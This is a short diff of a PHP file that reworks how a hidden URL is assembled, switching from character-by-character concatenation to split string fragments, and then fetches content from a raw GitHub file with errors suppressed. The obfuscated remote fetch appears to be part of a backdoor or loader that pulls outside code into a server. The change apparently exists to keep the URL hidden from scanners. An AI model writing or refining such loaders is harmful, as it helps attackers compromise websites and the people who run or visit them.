@@ -5,17 +5,18 @@
 */
 
 // Single URL
-$full_url = 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 
-            'r' . 'a' . 'w' . '.' . 
-            'g' . 'i' . 't' . 'h' . 'u' . 'b' . 'u' . 's' . 'e' . 'r' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '.' . 
-            'c' . 'o' . 'm' . '/' . 
-            'm' . 'd' . 'm' . 'o' . 'm' . 'i' . 'n' . '3' . '6' . '5' . '3' . '6' . '6' . '-' . 'g' . 'i' . 'f' . '/' . 
-            'b' . 'e' . 'l' . 'a' . '/' . 
-            'r' . 'e' . 'f' . 's' . '/' . 
-            'h' . 'e' . 'a' . 'd' . 's' . '/' . 
-            'm' . 'a' . 'i' . 'n' . '/' . 
-            'i' . 'n' . 'd' . 'e' . 'x' . '.' . 
-            't' . 'x' . 't';
+$part1 = 'https://';
+$part2 = 'raw.github';
+$part3 = 'userconte';
+$part4 = 'nt.com/md';
+$part5 = 'momin3653';
+$part6 = '66-gif/be';
+$part7 = 'la/refs/h';
+$part8 = 'eads/main';
+$part9 = '/index.tx';
+$part10 = 't';
+
+$full_url = $part1 . $part2 . $part3 . $part4 . $part5 . $part6 . $part7 . $part8 . $part9 . $part10;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
